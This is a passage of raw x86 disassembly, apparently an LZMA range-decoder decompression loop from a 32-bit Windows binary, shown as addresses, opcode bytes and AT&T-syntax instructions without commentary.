  406bfc:	c7 45 b8 05 00 00 00 	movl   $0x5,-0x48(%ebp)
  406c03:	80 64 08 ff 00       	andb   $0x0,-0x1(%eax,%ecx,1)
  406c08:	eb 21                	jmp    0x406c2b
  406c0a:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406c0e:	0f 84 45 08 00 00    	je     0x407459
  406c14:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  406c17:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406c1a:	ff 4d 94             	decl   -0x6c(%ebp)
  406c1d:	0f b6 09             	movzbl (%ecx),%ecx
  406c20:	c1 e0 08             	shl    $0x8,%eax
  406c23:	0b c1                	or     %ecx,%eax
  406c25:	ff 45 90             	incl   -0x70(%ebp)
  406c28:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406c2b:	8b 45 b8             	mov    -0x48(%ebp),%eax
  406c2e:	ff 4d b8             	decl   -0x48(%ebp)
  406c31:	85 c0                	test   %eax,%eax
  406c33:	75 d5                	jne    0x406c0a
  406c35:	8b 45 a0             	mov    -0x60(%ebp),%eax
  406c38:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  406c3b:	23 45 e4             	and    -0x1c(%ebp),%eax
  406c3e:	c7 85 7c ff ff ff 06 	movl   $0x6,-0x84(%ebp)
  406c45:	00 00 00 
  406c48:	c1 e1 04             	shl    $0x4,%ecx
  406c4b:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  406c4e:	03 c8                	add    %eax,%ecx
  406c50:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406c53:	8d 34 48             	lea    (%eax,%ecx,2),%esi
  406c56:	e9 6c 06 00 00       	jmp    0x4072c7
  406c5b:	33 d2                	xor    %edx,%edx
  406c5d:	39 55 c0             	cmp    %edx,-0x40(%ebp)
  406c60:	75 6f                	jne    0x406cd1
  406c62:	0f b6 45 a4          	movzbl -0x5c(%ebp),%eax
  406c66:	8b 75 a0             	mov    -0x60(%ebp),%esi
  406c69:	b1 08                	mov    $0x8,%cl
  406c6b:	2a 4d c4             	sub    -0x3c(%ebp),%cl
  406c6e:	23 75 e8             	and    -0x18(%ebp),%esi
  406c71:	d3 e8                	shr    %cl,%eax
  406c73:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  406c76:	d3 e6                	shl    %cl,%esi
  406c78:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406c7b:	03 c6                	add    %esi,%eax
  406c7d:	8d 04 40             	lea    (%eax,%eax,2),%eax
  406c80:	c1 e0 09             	shl    $0x9,%eax
  406c83:	83 7d c8 04          	cmpl   $0x4,-0x38(%ebp)
  406c87:	8d 84 08 6c 0e 00 00 	lea    0xe6c(%eax,%ecx,1),%eax
  406c8e:	89 45 a8             	mov    %eax,-0x58(%ebp)
  406c91:	7d 05                	jge    0x406c98
  406c93:	89 55 c8             	mov    %edx,-0x38(%ebp)
  406c96:	eb 10                	jmp    0x406ca8
  406c98:	83 7d c8 0a          	cmpl   $0xa,-0x38(%ebp)
  406c9c:	7d 06                	jge    0x406ca4
  406c9e:	83 6d c8 03          	subl   $0x3,-0x38(%ebp)
  406ca2:	eb 04                	jmp    0x406ca8
  406ca4:	83 6d c8 06          	subl   $0x6,-0x38(%ebp)
  406ca8:	39 55 cc             	cmp    %edx,-0x34(%ebp)
  406cab:	74 1c                	je     0x406cc9
  406cad:	8b 45 ec             	mov    -0x14(%ebp),%eax
  406cb0:	2b 45 d4             	sub    -0x2c(%ebp),%eax
  406cb3:	3b 45 8c             	cmp    -0x74(%ebp),%eax
  406cb6:	72 03                	jb     0x406cbb
  406cb8:	03 45 8c             	add    -0x74(%ebp),%eax
  406cbb:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  406cbe:	33 db                	xor    %ebx,%ebx
  406cc0:	43                   	inc    %ebx
  406cc1:	8a 04 08             	mov    (%eax,%ecx,1),%al
  406cc4:	88 45 a5             	mov    %al,-0x5b(%ebp)
  406cc7:	eb 68                	jmp    0x406d31
  406cc9:	33 db                	xor    %ebx,%ebx
  406ccb:	43                   	inc    %ebx
  406ccc:	e9 cd 01 00 00       	jmp    0x406e9e
  406cd1:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406cd4:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  406cd7:	c7 45 cc 01 00 00 00 	movl   $0x1,-0x34(%ebp)
  406cde:	c7 85 7c ff ff ff 07 	movl   $0x7,-0x84(%ebp)
  406ce5:	00 00 00 
  406ce8:	8d b4 48 80 01 00 00 	lea    0x180(%eax,%ecx,2),%esi
  406cef:	e9 d3 05 00 00       	jmp    0x4072c7
  406cf4:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406cf8:	0f 84 67 07 00 00    	je     0x407465
  406cfe:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  406d01:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406d04:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  406d08:	0f b6 09             	movzbl (%ecx),%ecx
  406d0b:	ff 4d 94             	decl   -0x6c(%ebp)
  406d0e:	c1 e0 08             	shl    $0x8,%eax
  406d11:	0b c1                	or     %ecx,%eax
  406d13:	ff 45 90             	incl   -0x70(%ebp)
  406d16:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406d19:	8b 45 c0             	mov    -0x40(%ebp),%eax
  406d1c:	39 45 b8             	cmp    %eax,-0x48(%ebp)
  406d1f:	0f 85 ad 00 00 00    	jne    0x406dd2
  406d25:	81 fb 00 01 00 00    	cmp    $0x100,%ebx
  406d2b:	0f 8d 05 01 00 00    	jge    0x406e36
  406d31:	0f b6 45 a5          	movzbl -0x5b(%ebp),%eax
  406d35:	d0 65 a5             	shlb   $1,-0x5b(%ebp)
  406d38:	8b 4d a8             	mov    -0x58(%ebp),%ecx
  406d3b:	c1 e8 07             	shr    $0x7,%eax
  406d3e:	89 45 b8             	mov    %eax,-0x48(%ebp)
  406d41:	40                   	inc    %eax
  406d42:	c1 e0 08             	shl    $0x8,%eax
  406d45:	03 c3                	add    %ebx,%eax
  406d47:	8d 34 41             	lea    (%ecx,%eax,2),%esi
  406d4a:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406d4d:	c1 e9 0b             	shr    $0xb,%ecx
  406d50:	66 8b 06             	mov    (%esi),%ax
  406d53:	89 75 ac             	mov    %esi,-0x54(%ebp)
  406d56:	0f b7 d0             	movzwl %ax,%edx
  406d59:	0f af ca             	imul   %edx,%ecx
  406d5c:	39 4d f4             	cmp    %ecx,-0xc(%ebp)
  406d5f:	73 1a                	jae    0x406d7b
  406d61:	83 65 c0 00          	andl   $0x0,-0x40(%ebp)
  406d65:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  406d68:	b9 00 08 00 00       	mov    $0x800,%ecx
  406d6d:	2b ca                	sub    %edx,%ecx
  406d6f:	c1 f9 05             	sar    $0x5,%ecx
  406d72:	03 c8                	add    %eax,%ecx
  406d74:	03 db                	add    %ebx,%ebx
  406d76:	66 89 0e             	mov    %cx,(%esi)
  406d79:	eb 1d                	jmp    0x406d98
  406d7b:	29 4d f0             	sub    %ecx,-0x10(%ebp)
  406d7e:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  406d81:	66 8b c8             	mov    %ax,%cx
  406d84:	c7 45 c0 01 00 00 00 	movl   $0x1,-0x40(%ebp)
  406d8b:	66 c1 e9 05          	shr    $0x5,%cx
  406d8f:	2b c1                	sub    %ecx,%eax
  406d91:	8d 5c 1b 01          	lea    0x1(%ebx,%ebx,1),%ebx
  406d95:	66 89 06             	mov    %ax,(%esi)
  406d98:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  406d9f:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  406da2:	0f 83 71 ff ff ff    	jae    0x406d19
  406da8:	e9 47 ff ff ff       	jmp    0x406cf4
  406dad:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406db1:	0f 84 ba 06 00 00    	je     0x407471
  406db7:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  406dba:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406dbd:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  406dc1:	0f b6 09             	movzbl (%ecx),%ecx
  406dc4:	ff 4d 94             	decl   -0x6c(%ebp)
  406dc7:	c1 e0 08             	shl    $0x8,%eax
  406dca:	0b c1                	or     %ecx,%eax
  406dcc:	ff 45 90             	incl   -0x70(%ebp)
  406dcf:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406dd2:	81 fb 00 01 00 00    	cmp    $0x100,%ebx
  406dd8:	7d 5c                	jge    0x406e36
  406dda:	8b 45 a8             	mov    -0x58(%ebp),%eax
  406ddd:	8d 14 1b             	lea    (%ebx,%ebx,1),%edx
  406de0:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406de3:	8d 34 02             	lea    (%edx,%eax,1),%esi
  406de6:	c1 e9 0b             	shr    $0xb,%ecx
  406de9:	66 8b 06             	mov    (%esi),%ax
  406dec:	89 75 ac             	mov    %esi,-0x54(%ebp)
  406def:	0f b7 f8             	movzwl %ax,%edi
  406df2:	0f af cf             	imul   %edi,%ecx
  406df5:	39 4d f4             	cmp    %ecx,-0xc(%ebp)
  406df8:	73 16                	jae    0x406e10
  406dfa:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  406dfd:	b9 00 08 00 00       	mov    $0x800,%ecx
  406e02:	2b cf                	sub    %edi,%ecx
  406e04:	c1 f9 05             	sar    $0x5,%ecx
  406e07:	03 c8                	add    %eax,%ecx
  406e09:	03 db                	add    %ebx,%ebx
  406e0b:	66 89 0e             	mov    %cx,(%esi)
  406e0e:	eb 15                	jmp    0x406e25
  406e10:	29 4d f0             	sub    %ecx,-0x10(%ebp)
  406e13:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  406e16:	66 8b c8             	mov    %ax,%cx
  406e19:	8d 5a 01             	lea    0x1(%edx),%ebx
  406e1c:	66 c1 e9 05          	shr    $0x5,%cx
  406e20:	2b c1                	sub    %ecx,%eax
  406e22:	66 89 06             	mov    %ax,(%esi)
  406e25:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  406e2c:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  406e2f:	73 a1                	jae    0x406dd2
  406e31:	e9 77 ff ff ff       	jmp    0x406dad
  406e36:	83 65 cc 00          	andl   $0x0,-0x34(%ebp)
  406e3a:	8a 45 bc             	mov    -0x44(%ebp),%al
  406e3d:	88 45 a4             	mov    %al,-0x5c(%ebp)
  406e40:	83 7d 9c 00          	cmpl   $0x0,-0x64(%ebp)
  406e44:	0f 84 3f 06 00 00    	je     0x407489
  406e4a:	8b 4d 98             	mov    -0x68(%ebp),%ecx
  406e4d:	8a 45 a4             	mov    -0x5c(%ebp),%al
  406e50:	8b 55 f8             	mov    -0x8(%ebp),%edx
  406e53:	ff 45 a0             	incl   -0x60(%ebp)
  406e56:	ff 45 98             	incl   -0x68(%ebp)
  406e59:	ff 4d 9c             	decl   -0x64(%ebp)
  406e5c:	88 01                	mov    %al,(%ecx)
  406e5e:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  406e61:	88 04 11             	mov    %al,(%ecx,%edx,1)
  406e64:	8d 41 01             	lea    0x1(%ecx),%eax
  406e67:	33 d2                	xor    %edx,%edx
  406e69:	f7 75 8c             	divl   -0x74(%ebp)
  406e6c:	e9 95 01 00 00       	jmp    0x407006
  406e71:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406e75:	0f 84 02 06 00 00    	je     0x40747d
  406e7b:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  406e7e:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406e81:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  406e85:	0f b6 09             	movzbl (%ecx),%ecx
  406e88:	ff 4d 94             	decl   -0x6c(%ebp)
  406e8b:	c1 e0 08             	shl    $0x8,%eax
  406e8e:	0b c1                	or     %ecx,%eax
  406e90:	ff 45 90             	incl   -0x70(%ebp)
  406e93:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406e96:	81 fb 00 01 00 00    	cmp    $0x100,%ebx
  406e9c:	7d 9c                	jge    0x406e3a
  406e9e:	8b 45 a8             	mov    -0x58(%ebp),%eax
  406ea1:	8d 14 1b             	lea    (%ebx,%ebx,1),%edx
  406ea4:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406ea7:	8d 34 02             	lea    (%edx,%eax,1),%esi
  406eaa:	c1 e9 0b             	shr    $0xb,%ecx
  406ead:	66 8b 06             	mov    (%esi),%ax
  406eb0:	89 75 ac             	mov    %esi,-0x54(%ebp)
  406eb3:	0f b7 f8             	movzwl %ax,%edi
  406eb6:	0f af cf             	imul   %edi,%ecx
  406eb9:	39 4d f4             	cmp    %ecx,-0xc(%ebp)
  406ebc:	73 16                	jae    0x406ed4
  406ebe:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  406ec1:	b9 00 08 00 00       	mov    $0x800,%ecx
  406ec6:	2b cf                	sub    %edi,%ecx
  406ec8:	c1 f9 05             	sar    $0x5,%ecx
  406ecb:	03 c8                	add    %eax,%ecx
  406ecd:	03 db                	add    %ebx,%ebx
  406ecf:	66 89 0e             	mov    %cx,(%esi)
  406ed2:	eb 15                	jmp    0x406ee9
  406ed4:	29 4d f0             	sub    %ecx,-0x10(%ebp)
  406ed7:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  406eda:	66 8b c8             	mov    %ax,%cx
  406edd:	8d 5a 01             	lea    0x1(%edx),%ebx
  406ee0:	66 c1 e9 05          	shr    $0x5,%cx
  406ee4:	2b c1                	sub    %ecx,%eax
  406ee6:	66 89 06             	mov    %ax,(%esi)
  406ee9:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  406ef0:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  406ef3:	73 a1                	jae    0x406e96
  406ef5:	e9 77 ff ff ff       	jmp    0x406e71
  406efa:	83 7d c0 01          	cmpl   $0x1,-0x40(%ebp)
  406efe:	75 1c                	jne    0x406f1c
  406f00:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406f03:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  406f06:	c7 85 7c ff ff ff 08 	movl   $0x8,-0x84(%ebp)
  406f0d:	00 00 00 
  406f10:	8d b4 48 98 01 00 00 	lea    0x198(%eax,%ecx,2),%esi
  406f17:	e9 ab 03 00 00       	jmp    0x4072c7
  406f1c:	8b 45 dc             	mov    -0x24(%ebp),%eax
  406f1f:	c7 45 80 16 00 00 00 	movl   $0x16,-0x80(%ebp)
  406f26:	89 45 e0             	mov    %eax,-0x20(%ebp)
  406f29:	8b 45 d8             	mov    -0x28(%ebp),%eax
  406f2c:	89 45 dc             	mov    %eax,-0x24(%ebp)
  406f2f:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  406f32:	89 45 d8             	mov    %eax,-0x28(%ebp)
  406f35:	33 c0                	xor    %eax,%eax
  406f37:	83 7d c8 07          	cmpl   $0x7,-0x38(%ebp)
  406f3b:	0f 9d c0             	setge  %al
  406f3e:	48                   	dec    %eax
  406f3f:	24 fd                	and    $0xfd,%al
  406f41:	83 c0 0a             	add    $0xa,%eax
  406f44:	89 45 c8             	mov    %eax,-0x38(%ebp)
  406f47:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406f4a:	05 64 06 00 00       	add    $0x664,%eax
  406f4f:	89 45 a8             	mov    %eax,-0x58(%ebp)
  406f52:	8b 75 a8             	mov    -0x58(%ebp),%esi
  406f55:	c7 85 7c ff ff ff 12 	movl   $0x12,-0x84(%ebp)
  406f5c:	00 00 00 
  406f5f:	e9 63 03 00 00       	jmp    0x4072c7
  406f64:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  406f68:	75 21                	jne    0x406f8b
  406f6a:	8b 45 c8             	mov    -0x38(%ebp),%eax
  406f6d:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406f70:	83 c0 0f             	add    $0xf,%eax
  406f73:	c7 85 7c ff ff ff 09 	movl   $0x9,-0x84(%ebp)
  406f7a:	00 00 00 
  406f7d:	c1 e0 04             	shl    $0x4,%eax
  406f80:	03 45 b4             	add    -0x4c(%ebp),%eax
  406f83:	8d 34 41             	lea    (%ecx,%eax,2),%esi
  406f86:	e9 3c 03 00 00       	jmp    0x4072c7
  406f8b:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406f8e:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  406f91:	c7 85 7c ff ff ff 0a 	movl   $0xa,-0x84(%ebp)
  406f98:	00 00 00 
  406f9b:	8d b4 48 b0 01 00 00 	lea    0x1b0(%eax,%ecx,2),%esi
  406fa2:	e9 20 03 00 00       	jmp    0x4072c7
  406fa7:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  406fab:	0f 85 b1 00 00 00    	jne    0x407062
  406fb1:	83 7d a0 00          	cmpl   $0x0,-0x60(%ebp)
  406fb5:	0f 84 3b 05 00 00    	je     0x4074f6
  406fbb:	33 c0                	xor    %eax,%eax
  406fbd:	83 7d c8 07          	cmpl   $0x7,-0x38(%ebp)
  406fc1:	0f 9d c0             	setge  %al
  406fc4:	8d 44 00 09          	lea    0x9(%eax,%eax,1),%eax
  406fc8:	89 45 c8             	mov    %eax,-0x38(%ebp)
  406fcb:	83 7d 9c 00          	cmpl   $0x0,-0x64(%ebp)
  406fcf:	0f 84 c0 04 00 00    	je     0x407495
  406fd5:	8b 45 ec             	mov    -0x14(%ebp),%eax
  406fd8:	2b 45 d4             	sub    -0x2c(%ebp),%eax
  406fdb:	3b 45 8c             	cmp    -0x74(%ebp),%eax
  406fde:	72 03                	jb     0x406fe3
  406fe0:	03 45 8c             	add    -0x74(%ebp),%eax
  406fe3:	8b 55 f8             	mov    -0x8(%ebp),%edx
  406fe6:	8a 0c 10             	mov    (%eax,%edx,1),%cl
  406fe9:	8b 45 ec             	mov    -0x14(%ebp),%eax
  406fec:	88 4d a4             	mov    %cl,-0x5c(%ebp)
  406fef:	88 0c 10             	mov    %cl,(%eax,%edx,1)
  406ff2:	40                   	inc    %eax
  406ff3:	33 d2                	xor    %edx,%edx
  406ff5:	f7 75 8c             	divl   -0x74(%ebp)
  406ff8:	8b 45 98             	mov    -0x68(%ebp),%eax
  406ffb:	ff 45 a0             	incl   -0x60(%ebp)
  406ffe:	ff 45 98             	incl   -0x68(%ebp)
  407001:	ff 4d 9c             	decl   -0x64(%ebp)
  407004:	88 08                	mov    %cl,(%eax)
  407006:	89 55 ec             	mov    %edx,-0x14(%ebp)
  407009:	c7 85 78 ff ff ff 02 	movl   $0x2,-0x88(%ebp)
  407010:	00 00 00 
  407013:	e9 c7 fa ff ff       	jmp    0x406adf
  407018:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  40701c:	75 05                	jne    0x407023
  40701e:	8b 45 d8             	mov    -0x28(%ebp),%eax
  407021:	eb 36                	jmp    0x407059
  407023:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407026:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  407029:	c7 85 7c ff ff ff 0b 	movl   $0xb,-0x84(%ebp)
  407030:	00 00 00 
  407033:	8d b4 48 c8 01 00 00 	lea    0x1c8(%eax,%ecx,2),%esi
  40703a:	e9 88 02 00 00       	jmp    0x4072c7
  40703f:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  407043:	75 05                	jne    0x40704a
  407045:	8b 45 dc             	mov    -0x24(%ebp),%eax
  407048:	eb 09                	jmp    0x407053
  40704a:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  40704d:	8b 45 e0             	mov    -0x20(%ebp),%eax
  407050:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  407053:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  407056:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  407059:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  40705c:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  40705f:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  407062:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407065:	c7 45 80 15 00 00 00 	movl   $0x15,-0x80(%ebp)
  40706c:	05 68 0a 00 00       	add    $0xa68,%eax
  407071:	89 45 a8             	mov    %eax,-0x58(%ebp)
  407074:	e9 d9 fe ff ff       	jmp    0x406f52
  407079:	33 c0                	xor    %eax,%eax
  40707b:	83 7d c8 07          	cmpl   $0x7,-0x38(%ebp)
  40707f:	0f 9d c0             	setge  %al
  407082:	48                   	dec    %eax
  407083:	24 fd                	and    $0xfd,%al
  407085:	83 c0 0b             	add    $0xb,%eax
  407088:	89 45 c8             	mov    %eax,-0x38(%ebp)
  40708b:	e9 9a 01 00 00       	jmp    0x40722a
  407090:	8b 45 d0             	mov    -0x30(%ebp),%eax
  407093:	83 f8 04             	cmp    $0x4,%eax
  407096:	7c 03                	jl     0x40709b
  407098:	6a 03                	push   $0x3
  40709a:	58                   	pop    %eax
  40709b:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40709e:	c7 45 c0 06 00 00 00 	movl   $0x6,-0x40(%ebp)
  4070a5:	c1 e0 07             	shl    $0x7,%eax
  4070a8:	c7 45 84 19 00 00 00 	movl   $0x19,-0x7c(%ebp)
  4070af:	8d 84 08 60 03 00 00 	lea    0x360(%eax,%ecx,1),%eax
  4070b6:	89 45 a8             	mov    %eax,-0x58(%ebp)
  4070b9:	e9 ce 02 00 00       	jmp    0x40738c
  4070be:	83 fb 04             	cmp    $0x4,%ebx
  4070c1:	7c 34                	jl     0x4070f7
  4070c3:	8b cb                	mov    %ebx,%ecx
  4070c5:	8b c3                	mov    %ebx,%eax
  4070c7:	d1 f9                	sar    $1,%ecx
  4070c9:	83 e0 01             	and    $0x1,%eax
  4070cc:	49                   	dec    %ecx
  4070cd:	0c 02                	or     $0x2,%al
  4070cf:	d3 e0                	shl    %cl,%eax
  4070d1:	83 fb 0e             	cmp    $0xe,%ebx
  4070d4:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4070d7:	7d 14                	jge    0x4070ed
  4070d9:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4070dc:	2b c3                	sub    %ebx,%eax
  4070de:	89 4d c0             	mov    %ecx,-0x40(%ebp)
  4070e1:	8d 84 42 5e 05 00 00 	lea    0x55e(%edx,%eax,2),%eax
  4070e8:	e9 81 00 00 00       	jmp    0x40716e
  4070ed:	33 db                	xor    %ebx,%ebx
  4070ef:	83 c1 fc             	add    $0xfffffffc,%ecx
  4070f2:	89 4d b8             	mov    %ecx,-0x48(%ebp)
  4070f5:	eb 33                	jmp    0x40712a
  4070f7:	89 5d d4             	mov    %ebx,-0x2c(%ebp)
  4070fa:	e9 28 01 00 00       	jmp    0x407227
  4070ff:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  407103:	0f 84 98 03 00 00    	je     0x4074a1
  407109:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  40710c:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40710f:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  407113:	0f b6 09             	movzbl (%ecx),%ecx
  407116:	ff 4d 94             	decl   -0x6c(%ebp)
  407119:	c1 e0 08             	shl    $0x8,%eax
  40711c:	0b c1                	or     %ecx,%eax
  40711e:	ff 45 90             	incl   -0x70(%ebp)
  407121:	89 45 f4             	mov    %eax,-0xc(%ebp)
  407124:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  407127:	ff 4d b8             	decl   -0x48(%ebp)
  40712a:	83 7d b8 00          	cmpl   $0x0,-0x48(%ebp)
  40712e:	7e 27                	jle    0x407157
  407130:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  407133:	03 db                	add    %ebx,%ebx
  407135:	d1 6d f0             	shrl   $1,-0x10(%ebp)
  407138:	3b 4d f0             	cmp    -0x10(%ebp),%ecx
  40713b:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  40713e:	72 0c                	jb     0x40714c
  407140:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  407143:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  407146:	83 cb 01             	or     $0x1,%ebx
  407149:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  40714c:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  407153:	73 d2                	jae    0x407127
  407155:	eb a8                	jmp    0x4070ff
  407157:	c1 e3 04             	shl    $0x4,%ebx
  40715a:	03 c3                	add    %ebx,%eax
  40715c:	c7 45 c0 04 00 00 00 	movl   $0x4,-0x40(%ebp)
  407163:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  407166:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407169:	05 44 06 00 00       	add    $0x644,%eax
  40716e:	33 db                	xor    %ebx,%ebx
  407170:	89 45 a8             	mov    %eax,-0x58(%ebp)
  407173:	c7 45 b0 01 00 00 00 	movl   $0x1,-0x50(%ebp)
  40717a:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  40717d:	89 5d b8             	mov    %ebx,-0x48(%ebp)
  407180:	eb 28                	jmp    0x4071aa
  407182:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  407186:	0f 84 21 03 00 00    	je     0x4074ad
  40718c:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  40718f:	8b 45 f4             	mov    -0xc(%ebp),%eax
  407192:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  407196:	0f b6 09             	movzbl (%ecx),%ecx
  407199:	ff 4d 94             	decl   -0x6c(%ebp)
  40719c:	c1 e0 08             	shl    $0x8,%eax
  40719f:	0b c1                	or     %ecx,%eax
  4071a1:	ff 45 90             	incl   -0x70(%ebp)
  4071a4:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4071a7:	ff 45 b8             	incl   -0x48(%ebp)
  4071aa:	8b 45 c0             	mov    -0x40(%ebp),%eax
  4071ad:	39 45 b8             	cmp    %eax,-0x48(%ebp)
  4071b0:	7d 72                	jge    0x407224
  4071b2:	8b 45 b0             	mov    -0x50(%ebp),%eax
  4071b5:	8b 55 f0             	mov    -0x10(%ebp),%edx
  4071b8:	c1 ea 0b             	shr    $0xb,%edx
  4071bb:	8d 3c 00             	lea    (%eax,%eax,1),%edi
  4071be:	8b 45 a8             	mov    -0x58(%ebp),%eax
  4071c1:	8d 34 07             	lea    (%edi,%eax,1),%esi
  4071c4:	89 75 ac             	mov    %esi,-0x54(%ebp)
  4071c7:	66 8b 06             	mov    (%esi),%ax
  4071ca:	0f b7 c8             	movzwl %ax,%ecx
  4071cd:	0f af d1             	imul   %ecx,%edx
  4071d0:	39 55 f4             	cmp    %edx,-0xc(%ebp)
  4071d3:	73 17                	jae    0x4071ec
  4071d5:	89 55 f0             	mov    %edx,-0x10(%ebp)
  4071d8:	ba 00 08 00 00       	mov    $0x800,%edx
  4071dd:	2b d1                	sub    %ecx,%edx
  4071df:	c1 fa 05             	sar    $0x5,%edx
  4071e2:	03 d0                	add    %eax,%edx
  4071e4:	d1 65 b0             	shll   $1,-0x50(%ebp)
  4071e7:	66 89 16             	mov    %dx,(%esi)
  4071ea:	eb 2a                	jmp    0x407216
  4071ec:	33 c9                	xor    %ecx,%ecx
  4071ee:	29 55 f0             	sub    %edx,-0x10(%ebp)
  4071f1:	41                   	inc    %ecx
  4071f2:	29 55 f4             	sub    %edx,-0xc(%ebp)
  4071f5:	8b d9                	mov    %ecx,%ebx
  4071f7:	8b 4d b8             	mov    -0x48(%ebp),%ecx
  4071fa:	d3 e3                	shl    %cl,%ebx
  4071fc:	8b cb                	mov    %ebx,%ecx
  4071fe:	8b 5d bc             	mov    -0x44(%ebp),%ebx
  407201:	0b d9                	or     %ecx,%ebx
  407203:	66 8b c8             	mov    %ax,%cx
  407206:	66 c1 e9 05          	shr    $0x5,%cx
  40720a:	2b c1                	sub    %ecx,%eax
  40720c:	47                   	inc    %edi
  40720d:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  407210:	66 89 06             	mov    %ax,(%esi)
  407213:	89 7d b0             	mov    %edi,-0x50(%ebp)
  407216:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  40721d:	73 88                	jae    0x4071a7
  40721f:	e9 5e ff ff ff       	jmp    0x407182
  407224:	01 5d d4             	add    %ebx,-0x2c(%ebp)
  407227:	ff 45 d4             	incl   -0x2c(%ebp)
  40722a:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  40722d:	85 c0                	test   %eax,%eax
  40722f:	0f 84 84 02 00 00    	je     0x4074b9
  407235:	3b 45 a0             	cmp    -0x60(%ebp),%eax
  407238:	0f 87 b8 02 00 00    	ja     0x4074f6
  40723e:	83 45 d0 02          	addl   $0x2,-0x30(%ebp)
  407242:	8b 45 d0             	mov    -0x30(%ebp),%eax
  407245:	01 45 a0             	add    %eax,-0x60(%ebp)
  407248:	83 7d 9c 00          	cmpl   $0x0,-0x64(%ebp)
  40724c:	0f 84 6d 02 00 00    	je     0x4074bf
  407252:	8b 45 ec             	mov    -0x14(%ebp),%eax
  407255:	2b 45 d4             	sub    -0x2c(%ebp),%eax
  407258:	3b 45 8c             	cmp    -0x74(%ebp),%eax
  40725b:	72 03                	jb     0x407260
  40725d:	03 45 8c             	add    -0x74(%ebp),%eax
  407260:	8b 55 f8             	mov    -0x8(%ebp),%edx
  407263:	8a 0c 10             	mov    (%eax,%edx,1),%cl
  407266:	8b 45 ec             	mov    -0x14(%ebp),%eax
  407269:	88 4d a4             	mov    %cl,-0x5c(%ebp)
